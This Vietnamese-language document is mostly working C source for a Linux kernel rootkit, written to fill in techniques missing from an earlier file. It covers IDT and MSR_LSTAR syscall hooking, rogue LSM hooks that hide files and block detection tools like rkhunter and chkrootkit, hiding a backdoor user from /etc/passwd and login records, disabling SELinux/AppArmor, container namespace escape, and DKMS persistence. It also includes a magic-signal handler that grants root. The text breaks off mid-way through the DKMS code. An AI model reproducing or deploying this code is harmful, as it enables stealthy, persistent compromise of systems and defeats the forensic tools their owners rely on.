# Linux Kernel Rootkit — Bổ sung 15 kỹ thuật còn thiếu

> Audit phát hiện 11 kỹ thuật MISSING + 4 kỹ thuật PARTIALLY COVERED.
> File này bổ sung full code cho tất cả.

---

## Mục lục

**Hooking bổ sung:**
- [IDT Hooking — Thay đổi Interrupt Descriptor Table](#idt-hooking)
- [MSR Hooking — Redirect syscall entry point](#msr-hooking)
- [LSM Hook Abuse — Lạm dụng Linux Security Module](#lsm-hook-abuse)

**Hiding bổ sung:**
- [User Hiding — utmp/wtmp/lastlog + /etc/passwd](#user-hiding)
- [Syscall Table Integrity Evasion — Qua mặt detection](#syscall-evasion)

**Privilege Escalation bổ sung:**
- [SELinux/AppArmor Bypass — Full code](#selinux-bypass)
- [Namespace Escape — Thoát container từ kernel](#namespace-escape)

**Persistence bổ sung:**
- [DKMS Persistence — Survive kernel upgrade](#dkms-persistence)
- [Boot Script Modification — rc.local, SysV init](#boot-script-persistence)

**Network/C2 bổ sung:**
- [Covert Timing Channel — Encode data trong timing](#timing-channel)

**Anti-Forensics bổ sung:**
- [Code Integrity Self-Check — Phát hiện analyst patch](#code-integrity)
- [Memory Forensics Evasion — Chống Volatility/LiME](#memory-forensics-evasion)

**Techniques mới:**
- [Keylogger — Keyboard input interception](#keylogger)
- [Credential Harvesting — Thu thập mật khẩu](#credential-harvesting)
- [/dev/kmem & /dev/mem — Classic memory access](#devkmem)

---

## IDT Hooking — Thay đổi Interrupt Descriptor Table {#idt-hooking}

```c
/* idt_hook.c — IDT entry modification
 *
 * File chính Chapter 2 Method 4 chỉ SCAN IDT để tìm sys_call_table.
 * Ở đây ta thực sự MODIFY IDT entry để redirect interrupt handler.
 *
 * IDT (Interrupt Descriptor Table):
 *   - 256 entries, mỗi entry = gate descriptor (16 bytes trên x86-64)
 *   - Mỗi entry trỏ tới handler function cho interrupt/exception đó
 *   - CPU lookup IDT khi: INT instruction, hardware interrupt, exception
 *
 * Kỹ thuật: thay thế handler cho INT 0x80 (legacy 32-bit syscall)
 * hoặc exception handler (page fault, general protection, etc.)
 *
 * Tại sao IDT hooking ít phổ biến:
 *   - INT 0x80 deprecated trên 64-bit (dùng SYSCALL instruction thay)
 *   - IDT modification dễ detect (LKRG check IDT integrity)
 *   - Chỉ 1 IDT per CPU (trên SMP phải hook tất cả CPUs)
 *   - Kernel 5.x+ có protections (ro_after_init)
 *
 * Vẫn useful vì:
 *   - Hook exception handlers (page fault → hide memory access)
 *   - Hook NMI handler (stealth debugging)
 *   - Một số detection tools không check IDT
 */

#include "rootkit.h"
#include <asm/desc.h>       /* gate_desc, idt_table */
#include <asm/desc_defs.h>  /* IDT entry structures */

/* IDT gate descriptor layout trên x86-64 (16 bytes):
 *
 *   Bytes 0-1:   offset_low   (bits 0-15 of handler address)
 *   Bytes 2-3:   segment      (code segment selector, usually 0x10)
 *   Byte  4:     ist          (Interrupt Stack Table index, 0-7)
 *   Byte  5:     type_attr    (gate type + DPL + present bit)
 *   Bytes 6-7:   offset_mid   (bits 16-31)
 *   Bytes 8-11:  offset_high  (bits 32-63)
 *   Bytes 12-15: reserved
 *
 * Handler address = offset_high:offset_mid:offset_low (64-bit)
 */

struct idt_backup {
    unsigned int   vector;       /* Interrupt vector number */
    gate_desc      original;     /* Saved original gate descriptor */
    unsigned long  orig_handler; /* Extracted original handler address */
};

static struct idt_backup idt_saved;

/* ── Extract handler address từ gate descriptor ── */
static unsigned long gate_to_addr(gate_desc *gate)
{
    unsigned long addr;

    addr  = (unsigned long)gate->offset_low;
    addr |= (unsigned long)gate->offset_middle << 16;
#ifdef CONFIG_X86_64
    addr |= (unsigned long)gate->offset_high << 32;
#endif
    return addr;
}

/* ── Lấy IDT base address ──
 *
 * SIDT instruction store IDT register (IDTR) vào memory.
 * IDTR chứa: limit (2 bytes) + base address (8 bytes trên x86-64).
 * Base address = pointer tới IDT table trong memory.
 */
static gate_desc *get_idt_table(void)
{
    struct desc_ptr idtr;
    store_idt(&idtr);
    return (gate_desc *)idtr.address;
}

/* ── Custom INT 0x80 handler ──
 *
 * Khi process chạy INT 0x80 (legacy syscall):
 *   1. CPU lookup IDT[0x80]
 *   2. Jump tới handler address trong IDT entry
 *   3. Handler chạy (ta control handler bây giờ)
 *
 * Registry state khi INT 0x80 trigger:
 *   eax = syscall number
 *   ebx = arg1, ecx = arg2, edx = arg3
 *   esi = arg4, edi = arg5, ebp = arg6
 *
 * QUAN TRỌNG: handler phải:
 *   1. Save tất cả registers
 *   2. Xử lý (intercept/modify)
 *   3. Jump tới original handler HOẶC return
 *   4. KHÔNG ĐƯỢC corrupt stack/registers
 */

/* Handler viết bằng ASM vì phải control register state chính xác */
extern void idt_hook_stub(void);

/* C handler gọi từ ASM stub */
static void idt_hook_handler(struct pt_regs *regs)
{
    /* Intercept specific syscall numbers */
    if (regs->ax == __NR_getdents64) {
        /* Log hoặc modify — tùy implementation */
    }
}

/* ASM stub template (nasm syntax, embed trong .S file):
 *
 * idt_hook_stub:
 *     ; Save all registers
 *     push rax
 *     push rbx
 *     push rcx
 *     push rdx
 *     push rsi
 *     push rdi
 *     push rbp
 *     push r8
 *     push r9
 *     push r10
 *     push r11
 *     push r12
 *     push r13
 *     push r14
 *     push r15
 *
 *     ; Pass register frame pointer as arg
 *     mov rdi, rsp
 *     call idt_hook_handler     ; C function
 *
 *     ; Restore all registers
 *     pop r15
 *     pop r14
 *     ...
 *     pop rax
 *
 *     ; Jump to original handler
 *     jmp [orig_handler_addr]
 */

/* ── Build modified gate descriptor ── */
static void build_gate(gate_desc *gate, unsigned long handler)
{
    /* Pack 64-bit address vào 3 offset fields */
    gate->offset_low    = (u16)(handler & 0xFFFF);
    gate->offset_middle = (u16)((handler >> 16) & 0xFFFF);
#ifdef CONFIG_X86_64
    gate->offset_high   = (u32)((handler >> 32) & 0xFFFFFFFF);
#endif
    /* Giữ nguyên segment, IST, type, DPL, present từ original */
}

/* ── Install IDT hook ── */
static int install_idt_hook(unsigned int vector, void *new_handler)
{
    gate_desc *idt;
    gate_desc new_gate;

    if (vector > 255)
        return -EINVAL;

    idt = get_idt_table();

    /* Backup original entry */
    idt_saved.vector = vector;
    memcpy(&idt_saved.original, &idt[vector], sizeof(gate_desc));
    idt_saved.orig_handler = gate_to_addr(&idt[vector]);

    /* Build new gate descriptor */
    memcpy(&new_gate, &idt[vector], sizeof(gate_desc));
    build_gate(&new_gate, (unsigned long)new_handler);

    /* Write new entry — cần bypass write protection.
     *
     * IDT nằm trong read-only memory trên kernel mới.
     * Phải dùng set_memory_rw hoặc PTE manipulation.
     * Hoặc: dùng write_idt_entry() kernel API nếu available. */
    rk_unprotect_memory();

    /* Phải update trên ALL CPUs (SMP safety).
     * Mỗi CPU CÓ THỂ có IDT riêng (nhưng thường share).
     * load_idt() per-CPU nếu cần. */
    unsigned long flags;
    local_irq_save(flags);
    memcpy(&idt[vector], &new_gate, sizeof(gate_desc));
    local_irq_restore(flags);

    rk_protect_memory();

    pr_info("rk: IDT[%u] hooked: %px → %px\n",
            vector, (void *)idt_saved.orig_handler, new_handler);
    return 0;
}

/* ── Remove IDT hook ── */
static void remove_idt_hook(void)
{
    gate_desc *idt = get_idt_table();
    unsigned long flags;

    rk_unprotect_memory();
    local_irq_save(flags);
    memcpy(&idt[idt_saved.vector], &idt_saved.original, sizeof(gate_desc));
    local_irq_restore(flags);
    rk_protect_memory();

    pr_info("rk: IDT[%u] restored\n", idt_saved.vector);
}
```

---

## MSR Hooking — Redirect syscall entry point {#msr-hooking}

```c
/* msr_hook.c — SYSCALL entry point redirection via MSR_LSTAR
 *
 * File chính Chapter 2 Method 3 chỉ ĐỌC MSR_LSTAR.
 * Ở đây ta GHI MSR_LSTAR để redirect syscall entry.
 *
 * MSR_LSTAR (0xC0000082):
 *   Chứa address của entry_SYSCALL_64 — function kernel chạy
 *   mỗi khi userspace execute SYSCALL instruction.
 *
 * SYSCALL flow bình thường:
 *   User: SYSCALL → CPU reads MSR_LSTAR → jump tới entry_SYSCALL_64
 *   → entry_SYSCALL_64 save regs → lookup sys_call_table → call handler
 *
 * SYSCALL flow sau MSR hook:
 *   User: SYSCALL → CPU reads MSR_LSTAR → jump tới OUR handler
 *   → OUR handler: intercept → call original entry_SYSCALL_64
 *
 * Ưu điểm:
 *   - Hook TẤT CẢ syscalls cùng lúc (không cần hook từng entry)
 *   - Sâu hơn syscall table hooking
 *   - Một số detection tools chỉ check syscall table, không check MSR
 *
 * Nhược điểm:
 *   - Phải handle trên TỪNG CPU (MSR là per-CPU register)
 *   - Rất dễ crash nếu handler code sai (brick hệ thống)
 *   - LKRG và một số tools check MSR_LSTAR
 *   - Performance impact nếu handler không tối ưu
 */

#include "rootkit.h"
#include <asm/msr.h>

static unsigned long orig_syscall_entry = 0;

/* ── Custom SYSCALL entry point ──
 *
 * PHẢI viết bằng ASM vì:
 *   1. Khi CPU jump vào đây, state rất "raw":
 *      - RSP = userspace stack pointer (CHƯA switch sang kernel stack)
 *      - RCX = userspace RIP (return address)
 *      - R11 = userspace RFLAGS
 *      - RAX = syscall number
 *   2. Phải swap stack, save registers CHÍNH XÁC như entry_SYSCALL_64
 *   3. Bất kỳ sai sót nào = instant crash
 *
 * Approach an toàn: minimal intercept rồi jump tới original.
 * Chỉ check RAX (syscall number), nếu target → modify,
 * sau đó jump thẳng tới original entry_SYSCALL_64.
 */

/* C callback — gọi từ ASM wrapper khi syscall number match */
static long msr_hook_filter(unsigned long syscall_nr,
                             struct pt_regs *regs)
{
    /* Ví dụ: intercept getdents64 */
    if (syscall_nr == __NR_kill) {
        pid_t pid = (pid_t)regs->di;
        int sig = (int)regs->si;
        if (sig == MAGIC_SIGNAL && pid == MAGIC_PID) {
            /* Give root — xử lý trong đây */
            struct cred *new = prepare_creds();
            if (new) {
                new->uid.val = new->euid.val = 0;
                new->gid.val = new->egid.val = 0;
                new->cap_effective = CAP_FULL_SET;
                new->cap_permitted = CAP_FULL_SET;
                commit_creds(new);
            }
            return 0;  /* Intercepted — don't call original */
        }
    }
    return -1;  /* Not intercepted — proceed to original */
}

/* ── per-CPU MSR write ──
 *
 * MSR_LSTAR là per-CPU: mỗi CPU core có giá trị riêng.
 * Phải update trên TẤT CẢ CPUs.
 *
 * on_each_cpu(): gọi function trên mỗi CPU (IPI = Inter-Processor Interrupt).
 * Function chạy trong interrupt context trên mỗi CPU.
 */
static void write_msr_on_cpu(void *data)
{
    unsigned long new_entry = *(unsigned long *)data;
    wrmsrl(MSR_LSTAR, new_entry);
}

static void restore_msr_on_cpu(void *data)
{
    wrmsrl(MSR_LSTAR, orig_syscall_entry);
}

/* ── Install MSR hook ── */
static int install_msr_hook(unsigned long new_entry)
{
    /* Save original entry point */
    rdmsrl(MSR_LSTAR, orig_syscall_entry);
    pr_info("rk: original SYSCALL entry: %px\n", (void *)orig_syscall_entry);

    /* Write new entry on all CPUs */
    on_each_cpu(write_msr_on_cpu, &new_entry, 1);

    pr_info("rk: MSR_LSTAR hooked on all CPUs\n");
    return 0;
}

/* ── Remove MSR hook ── */
static void remove_msr_hook(void)
{
    if (orig_syscall_entry) {
        on_each_cpu(restore_msr_on_cpu, NULL, 1);
        pr_info("rk: MSR_LSTAR restored\n");
    }
}
```

---

## LSM Hook Abuse — Lạm dụng Linux Security Module {#lsm-hook-abuse}

```c
/* lsm_abuse.c — Lạm dụng Linux Security Module framework
 *
 * LSM = framework cho phép security modules (SELinux, AppArmor, SMACK)
 * hook vào kernel operations. Mỗi sensitive operation gọi
 * security_*() function → LSM hook chain.
 *
 * Rootkit abuse: đăng ký LSM module giả → hook mọi security-sensitive
 * operation (file access, process creation, socket operations, etc.)
 *
 * Ưu điểm so với syscall hooking:
 *   - LSM hooks ở ĐÚNG security decision point
 *   - Hàng trăm hook points (nhiều hơn syscall table)
 *   - "Legitimate" — admin cài LSM module = bình thường
 *   - Stacking LSM (kernel 5.x+): nhiều LSMs cùng lúc
 *
 * Nhược điểm:
 *   - LSM registration API restricted (security_add_hooks)
 *   - Kernel CONFIG_LSM_STACKING hoặc CONFIG_SECURITY cần enabled
 *   - Một số kernel không cho register LSM sau boot
 *
 * APT context: Winnti group exploit LSM-like mechanisms.
 */

#include "rootkit.h"
#include <linux/lsm_hooks.h>   /* security_hook_list, các macro */
#include <linux/security.h>

/* ── LSM Hook: file_permission ──
 *
 * Gọi mỗi khi process access file. Có thể:
 *   - Log tất cả file access
 *   - Block access tới specific files
 *   - Hide files (return -ENOENT cho "invisible" files)
 */
static int rk_file_permission(struct file *file, int mask)
{
    char buf[256];
    char *path;

    if (!file || !file->f_path.dentry)
        return 0;  /* Allow */

    path = d_path(&file->f_path, buf, sizeof(buf));
    if (IS_ERR(path))
        return 0;

    /* Ẩn rootkit files: return -ENOENT khi ai đọc file rootkit */
    if (strstr(path, HIDDEN_PREFIX))
        return -ENOENT;  /* File "không tồn tại" */

    return 0;  /* Allow mọi thứ khác */
}

/* ── LSM Hook: task_kill ──
 *
 * Gọi khi process gửi signal. Intercept magic signal.
 */
static int rk_task_kill(struct task_struct *p, struct kernel_siginfo *info,
                         int sig, const struct cred *cred)
{
    if (sig == MAGIC_SIGNAL) {
        /* Xử lý magic signal — give root, hide process, etc. */
        return 0;  /* Allow (đã xử lý trong syscall hook) */
    }
    return 0;
}

/* ── LSM Hook: inode_permission ──
 *
 * Gọi TRƯỚC mỗi inode access. Sâu hơn file_permission.
 * Control access tới files, directories, devices.
 */
static int rk_inode_permission(struct inode *inode, int mask)
{
    /* Có thể dùng để:
     * - Block read access tới /sys/kernel/debug/kprobes/list
     *   (chống detection)
     * - Block write tới rootkit persistence files
     *   (chống removal) */
    return 0;
}

/* ── LSM Hook: socket_connect ──
 *
 * Gọi khi process connect() socket. Monitor outbound connections.
 */
static int rk_socket_connect(struct socket *sock,
                               struct sockaddr *address,
                               int addrlen)
{
    if (address->sa_family == AF_INET) {
        struct sockaddr_in *sin = (struct sockaddr_in *)address;
        /* Log mọi outbound TCP connection */
        pr_info("rk: connect to %pI4:%d\n",
                &sin->sin_addr, ntohs(sin->sin_port));
    }
    return 0;
}

/* ── LSM Hook: bprm_check_security ──
 *
 * Gọi TRƯỚC mỗi execve. Có thể block execution hoặc log.
 * Tại đây ta CÓ QUYỀN nói "no" cho execution.
 */
static int rk_bprm_check(struct linux_binprm *bprm)
{
    /* Block specific binaries (anti-forensics tools) */
    if (bprm->filename) {
        if (strstr(bprm->filename, "rkhunter") ||
            strstr(bprm->filename, "chkrootkit") ||
            strstr(bprm->filename, "aide")) {
            /* Return -EACCES = "Permission denied" khi chạy detection tool.
             * Hoặc: không block mà chỉ log (stealth hơn). */
            return -EACCES;
        }
    }
    return 0;
}

/* ── Đăng ký LSM hooks ──
 *
 * Trên kernel có CONFIG_SECURITY=y, ta dùng security_add_hooks().
 * Tuy nhiên API này thường restricted (not exported).
 *
 * Workaround: Tìm security_hook_heads (struct chứa list heads
 * cho mỗi hook type) qua kallsyms, rồi list_add trực tiếp.
 *
 * Đây là DKOM approach cho LSM — thêm hook trực tiếp vào
 * linked list thay vì dùng official API.
 */

struct security_hook_heads *rk_hook_heads = NULL;

/* Hook list entries — mỗi entry link vào một hook chain */
static struct security_hook_list rk_hooks[] = {
    /* Macro LSM_HOOK_INIT tạo security_hook_list entry:
     *   .head = &security_hook_heads->hook_name
     *   .hook.hook_name = function pointer */
    LSM_HOOK_INIT(file_permission, rk_file_permission),
    LSM_HOOK_INIT(inode_permission, rk_inode_permission),
    LSM_HOOK_INIT(task_kill, rk_task_kill),
    LSM_HOOK_INIT(socket_connect, rk_socket_connect),
    LSM_HOOK_INIT(bprm_check_security, rk_bprm_check),
};

static int rk_lsm_install(void)
{
    /* Tìm security_hook_heads structure */
    rk_hook_heads = (struct security_hook_heads *)
        rk_lookup_name("security_hook_heads");

    if (!rk_hook_heads) {
        pr_err("rk: security_hook_heads not found\n");
        return -ENOENT;
    }

    /* Trực tiếp add hooks vào linked lists (DKOM approach).
     * Mỗi hook type trong security_hook_heads là hlist_head.
     * Ta add entry vào cuối list. */
    int i;
    for (i = 0; i < ARRAY_SIZE(rk_hooks); i++) {
        struct security_hook_list *shook = &rk_hooks[i];
        /* hlist_add_tail_rcu: add vào cuối list, RCU-safe.
         * Hooks mới active cho mọi subsequent security checks. */
        hlist_add_tail_rcu(&shook->list, shook->head);
    }

    pr_info("rk: %d LSM hooks installed\n", (int)ARRAY_SIZE(rk_hooks));
    return 0;
}

static void rk_lsm_remove(void)
{
    int i;
    for (i = 0; i < ARRAY_SIZE(rk_hooks); i++) {
        hlist_del_rcu(&rk_hooks[i].list);
    }
    synchronize_rcu();
    pr_info("rk: LSM hooks removed\n");
}
```

---

## User Hiding — utmp/wtmp/lastlog + /etc/passwd {#user-hiding}

```c
/* user_hide.c — Ẩn user khỏi /etc/passwd, utmp, wtmp, lastlog
 *
 * Khi attacker tạo backdoor user, user đó visible qua:
 *   1. /etc/passwd — `cat /etc/passwd` hoặc `getent passwd`
 *   2. utmp (/var/run/utmp) — `who`, `w` (logged-in users)
 *   3. wtmp (/var/log/wtmp) — `last` (login history)
 *   4. lastlog (/var/log/lastlog) — `lastlog` (last login per user)
 *
 * Strategy: hook read() syscall, filter output cho files trên.
 * utmp/wtmp là BINARY format → cần parse struct utmp.
 */

#include "rootkit.h"
#include <linux/uaccess.h>

#define HIDDEN_USER "rk_user"

/* ── struct utmp layout ──
 *
 * Defined in <utmp.h> (userspace), ta define lại cho kernel:
 *
 * Mỗi entry = 384 bytes (trên x86-64).
 * utmp, wtmp dùng cùng format — chỉ khác file path.
 */
#define UT_NAMESIZE  32
#define UT_LINESIZE  32
#define UT_HOSTSIZE  256

struct kernel_utmp {
    short   ut_type;              /* Type of login */
    pid_t   ut_pid;               /* PID of login process */
    char    ut_line[UT_LINESIZE]; /* TTY name - "/dev/" */
    char    ut_id[4];             /* Terminal name suffix */
    char    ut_user[UT_NAMESIZE]; /* Username */
    char    ut_host[UT_HOSTSIZE]; /* Hostname for remote login */
    struct {
        int e_termination;
        int e_exit;
    } ut_exit;
    long    ut_session;
    struct {
        int tv_sec;
        int tv_usec;
    } ut_tv;
    int     ut_addr_v6[4];
    char    __unused[20];
};

#define UTMP_ENTRY_SIZE sizeof(struct kernel_utmp)  /* 384 bytes */

/* ── Filter /etc/passwd output ──
 *
 * /etc/passwd là text file, mỗi dòng:
 *   username:x:uid:gid:comment:home:shell
 *
 * Hook read() cho /etc/passwd, filter dòng chứa HIDDEN_USER.
 * Logic giống hooked_read cho /proc/modules (Chapter 3).
 */
static long filter_passwd_read(const struct pt_regs *regs,
                                long orig_ret)
{
    int fd = (int)regs->di;
    char __user *user_buf = (char __user *)regs->si;
    char *kern_buf, *src, *dst;
    long new_ret;

    if (orig_ret <= 0) return orig_ret;

    /* Check nếu đang đọc /etc/passwd */
    if (!is_target_file(fd, "/etc/passwd"))
        return orig_ret;

    kern_buf = kzalloc(orig_ret + 1, GFP_KERNEL);
    if (!kern_buf) return orig_ret;

    if (copy_from_user(kern_buf, user_buf, orig_ret)) {
        kfree(kern_buf);
        return orig_ret;
    }
    kern_buf[orig_ret] = '\0';

    /* Filter: remove lines chứa HIDDEN_USER */
    src = kern_buf;
    dst = kern_buf;
    new_ret = 0;

    while (*src) {
        char *eol = strchr(src, '\n');
        int line_len = eol ? (eol - src + 1) : strlen(src);

        if (!strnstr(src, HIDDEN_USER, line_len)) {
            /* Giữ dòng này */
            if (dst != src)
                memmove(dst, src, line_len);
            dst += line_len;
            new_ret += line_len;
        }
        /* Else: skip dòng (ẩn user) */

        src += line_len;
    }

    if (new_ret > 0)
        copy_to_user(user_buf, kern_buf, new_ret);

    kfree(kern_buf);
    return new_ret;
}

/* ── Filter utmp/wtmp binary records ──
 *
 * utmp/wtmp chứa array of struct utmp (384 bytes mỗi entry).
 * read() return N * 384 bytes.
 * Filter: remove entries có ut_user == HIDDEN_USER.
 */
static long filter_utmp_read(const struct pt_regs *regs,
                              long orig_ret,
                              const char *target_path)
{
    int fd = (int)regs->di;
    char __user *user_buf = (char __user *)regs->si;
    char *kern_buf;
    long new_ret = 0;
    int i, num_entries;

    if (orig_ret <= 0) return orig_ret;
    if (!is_target_file(fd, target_path))
        return orig_ret;

    kern_buf = kzalloc(orig_ret, GFP_KERNEL);
    if (!kern_buf) return orig_ret;

    if (copy_from_user(kern_buf, user_buf, orig_ret)) {
        kfree(kern_buf);
        return orig_ret;
    }

    num_entries = orig_ret / UTMP_ENTRY_SIZE;

    /* Iterate entries, compact visible ones */
    for (i = 0; i < num_entries; i++) {
        struct kernel_utmp *entry =
            (struct kernel_utmp *)(kern_buf + i * UTMP_ENTRY_SIZE);

        if (strncmp(entry->ut_user, HIDDEN_USER,
                    strlen(HIDDEN_USER)) == 0) {
            /* Hidden user entry — skip */
            continue;
        }

        /* Visible entry — copy tới output position */
        if (new_ret != i * UTMP_ENTRY_SIZE)
            memmove(kern_buf + new_ret, entry, UTMP_ENTRY_SIZE);
        new_ret += UTMP_ENTRY_SIZE;
    }

    if (new_ret > 0)
        copy_to_user(user_buf, kern_buf, new_ret);

    kfree(kern_buf);
    return new_ret;
}

/* ── Tích hợp vào hooked_read ──
 *
 * Thêm vào hooked_read() (Chapter 3):
 *
 * static asmlinkage long hooked_read(const struct pt_regs *regs)
 * {
 *     long ret = orig_read(regs);
 *     ret = filter_passwd_read(regs, ret);
 *     ret = filter_utmp_read(regs, ret, "/var/run/utmp");
 *     ret = filter_utmp_read(regs, ret, "/var/log/wtmp");
 *     return ret;
 * }
 *
 * lastlog: dùng /var/log/lastlog, format khác (struct lastlog = 292 bytes).
 * Cần filter tương tự nhưng index by UID (record position = UID * sizeof).
 */
```

---

## SELinux/AppArmor Bypass — Full code {#selinux-bypass}

```c
/* selinux_bypass.c — Bypass Mandatory Access Control
 *
 * SELinux enforce access control NGOÀI Unix DAC (rwx permissions).
 * Ngay cả root cũng bị SELinux restrict.
 *
 * Kernel-level bypass methods:
 *   1. Disable SELinux enforce mode
 *   2. Null security blob trong credentials
 *   3. Set process context thành unconfined
 *   4. Modify selinux_enforcing variable trực tiếp
 */

#include "rootkit.h"

/* ══════════════════════════════════════════════════════════════
 * Method 1: Disable SELinux enforce mode
 *
 * selinux_enforcing = global int variable.
 *   1 = enforcing (block violations)
 *   0 = permissive (log only, don't block)
 *
 * Equivalent: setenforce 0 (nhưng từ kernel, không cần selinux tools).
 * ══════════════════════════════════════════════════════════════ */
static void rk_selinux_disable(void)
{
    int *enforcing;

    enforcing = (int *)rk_lookup_name("selinux_enforcing");
    if (enforcing) {
        *enforcing = 0;
        pr_info("rk: SELinux set to permissive\n");
    }

    /* Alternative: selinux_state structure (kernel 5.x+)
     *
     * struct selinux_state có field .enforcing.
     * Nếu selinux_enforcing không tồn tại (newer kernels):
     */
    void *state = (void *)rk_lookup_name("selinux_state");
    if (state) {
        /* struct selinux_state {
         *     bool disabled;
         *     bool enforcing;  // offset varies by kernel version
         *     ...
         * };
         * Hack: scan for enforcing field */
        bool *disabled = (bool *)state;
        *disabled = true;  /* selinux_state.disabled = true */
    }
}

/* ══════════════════════════════════════════════════════════════
 * Method 2: Null credential security blob
 *
 * Mỗi struct cred có `void *security` field.
 * LSM (SELinux/AppArmor) stores context info tại đây.
 *
 * Nếu security = NULL → LSM checks trả về "allowed"
 * (nhiều SELinux check functions early-return khi NULL).
 *
 * Hoặc: copy security blob từ init_cred (PID 1, unconfined).
 * ══════════════════════════════════════════════════════════════ */
static void rk_bypass_lsm_for_current(void)
{
    struct cred *cred;
    const struct cred *init_cred_ptr;

    /* Get init process credentials (PID 1 = unconfined context) */
    init_cred_ptr = (const struct cred *)rk_lookup_name("init_cred");

    cred = (struct cred *)current->cred;

    if (init_cred_ptr && init_cred_ptr->security) {
        /* Copy init_cred's security blob → current gets unconfined context */
        cred->security = init_cred_ptr->security;
    } else {
        /* Fallback: NULL security blob */
        cred->security = NULL;
    }
}

/* ══════════════════════════════════════════════════════════════
 * Method 3: AppArmor bypass
 *
 * AppArmor stores profile info trong task->security.
 * Mỗi profile define allowed operations.
 *
 * "unconfined" profile = no restrictions.
 * Set current task's AppArmor profile → unconfined.
 * ══════════════════════════════════════════════════════════════ */
static void rk_apparmor_bypass(void)
{
    /* AppArmor uses cred->security to store aa_label.
     * aa_label contains current profile.
     *
     * Approach: set cred->security tới unconfined label.
     * unconfined label = root_ns->unconfined trong AppArmor. */
    rk_bypass_lsm_for_current();
}
```

---

## Namespace Escape — Thoát container từ kernel {#namespace-escape}

```c
/* namespace_escape.c — Escape Linux namespaces (container breakout)
 *
 * Containers (Docker, LXC, Podman) = process isolation via namespaces:
 *   PID namespace:    process chỉ thấy PIDs trong cùng namespace
 *   NET namespace:    isolated network stack
 *   MNT namespace:    isolated filesystem mounts
 *   UTS namespace:    isolated hostname
 *   USER namespace:   UID/GID mapping
 *   IPC namespace:    isolated IPC objects
 *
 * Container breakout từ kernel: switch sang init namespace
 * (namespace của host system PID 1).
 *
 * Khi rootkit module load TRONG container (cần CAP_SYS_MODULE):
 *   → Module chạy trong kernel space = shared bởi tất cả containers
 *   → Nhưng current task thuộc container namespace
 *   → Switch namespace → escape container isolation
 */

#include "rootkit.h"
#include <linux/nsproxy.h>     /* nsproxy, task_struct->nsproxy */
#include <linux/pid_namespace.h>
#include <linux/fs_struct.h>   /* task_struct->fs */
#include <linux/mount.h>

/* ── Switch process vào init namespace ──
 *
 * Mỗi process có nsproxy struct chứa pointers tới tất cả namespaces:
 *   struct nsproxy {
 *       struct uts_namespace  *uts_ns;
 *       struct ipc_namespace  *ipc_ns;
 *       struct mnt_namespace  *mnt_ns;
 *       struct pid_namespace  *pid_ns_for_children;
 *       struct net            *net_ns;
 *       struct cgroup_namespace *cgroup_ns;
 *   };
 *
 * init_nsproxy = nsproxy của PID 1 (host system).
 * Switch current->nsproxy → init_nsproxy = escape container.
 */
static void rk_escape_namespaces(void)
{
    struct nsproxy *init_nsp;
    struct task_struct *init_task_ptr;

    /* Lấy init_nsproxy — namespace set của host */
    init_nsp = (struct nsproxy *)rk_lookup_name("init_nsproxy");
    if (!init_nsp) {
        /* Fallback: lấy từ init_task (PID 0, idle task) */
        init_task_ptr = (struct task_struct *)rk_lookup_name("init_task");
        if (init_task_ptr)
            init_nsp = init_task_ptr->nsproxy;
    }

    if (!init_nsp) {
        pr_err("rk: cannot find init_nsproxy\n");
        return;
    }

    /* Switch namespaces.
     *
     * switch_task_namespaces(task, new_nsproxy):
     *   Kernel API cho namespace switching.
     *   Atomic swap + reference counting.
     */
    void (*switch_ns)(struct task_struct *, struct nsproxy *);
    switch_ns = (void *)rk_lookup_name("switch_task_namespaces");

    if (switch_ns) {
        /* Tăng refcount trước khi share */
        get_nsproxy(init_nsp);
        switch_ns(current, init_nsp);
        pr_info("rk: escaped to init namespaces\n");
    } else {
        /* Manual approach: trực tiếp swap nsproxy */
        struct nsproxy *old = current->nsproxy;
        get_nsproxy(init_nsp);
        current->nsproxy = init_nsp;
        put_nsproxy(old);
    }

    /* Switch filesystem root — container có chroot vào /container/root.
     * Phải switch fs->root tới host root để thấy full filesystem.
     *
     * init_task->fs->root = host root filesystem.
     */
    struct fs_struct *init_fs;
    init_task_ptr = (struct task_struct *)rk_lookup_name("init_task");
    if (init_task_ptr && init_task_ptr->fs) {
        init_fs = init_task_ptr->fs;
        /* Copy root path từ init task */
        spin_lock(&current->fs->lock);
        current->fs->root = init_fs->root;
        path_get(&current->fs->root);
        current->fs->pwd = init_fs->root;
        path_get(&current->fs->pwd);
        spin_unlock(&current->fs->lock);
        pr_info("rk: filesystem root switched to host\n");
    }
}
```

---

## DKMS Persistence — Survive kernel upgrade {#dkms-persistence}

```c
/* dkms_persist.c — DKMS auto-rebuild across kernel upgrades
 *
 * DKMS (Dynamic Kernel Module Support):
 *   - Framework tự động rebuild kernel module khi kernel update
 *   - Dùng bởi NVIDIA drivers, VirtualBox, ZFS
 *   - Module source ở /usr/src/MODULE-VERSION/
 *   - dkms.conf define build instructions
 *   - apt/dnf kernel upgrade trigger → DKMS rebuild all registered modules
 *
 * Vì sao DKMS quan trọng cho persistence:
 *   Tất cả persistence methods khác dùng .ko file compiled cho
 *   SPECIFIC kernel version. Kernel upgrade → .ko incompatible → rootkit die.
 *   DKMS TỰ ĐỘNG recompile → survive kernel upgrade.
 */

#include "rootkit.h"
#include <linux/kmod.h>

static void persist_dkms(const char *module_name,
                          const char *source_dir)
{
    char cmd[4096];

    snprintf(cmd, sizeof(cmd),
        /* 1. Tạo DKMS source directory */
        "mkdir -p /usr/src/%s-1.0; "

        /* 2. Copy source files vào DKMS directory */
        "cp %s/*.c %s/*.h %s/Makefile /usr/src/%s-1.0/ 2>/dev/null; "

        /* 3. Tạo dkms.conf */
        "cat > /usr/src/%s-1.0/dkms.conf << 'DKMSEOF'\n"
        "PACKAGE_NAME=\"%s\"\n"
        "PACKAGE_VERSION=\"1.0\"\n"
        "BUILT_MODULE_NAME[0]=\"%s\"\n"
        "DEST_MODULE_LOCATION[0]=\"/extra\"\n"
        "AUTOINSTALL=\"yes\"\n"
        "MAKE[0]=\"make -C /lib/modules/${kernelver}/build "
        "M=${dkms_tree}/${PACKAGE_NAME}/${PACKAGE_VERSION}/build modules\"\n"
        "CLEAN=\"make -C /lib/modules/${kernelver}/build "
        "M=${dkms_tree}/${PACKAGE_NAME}/${PACKAGE_VERSION}/build clean\"\n"
        "DKMSEOF\n"

        /* 4. Add module tới DKMS */
        "dkms add -m %s -v 1.0 2>/dev/null; "

        /* 5. Build cho current kernel */
        "dkms build -m %s -v 1.0 2>/dev/null; "

        /* 6. Install — auto-load at boot */
        "dkms install -m %s -v 1.0 2>/dev/null; "

        /* 7. Verify */
        "dkms status %s 2>/dev/null",

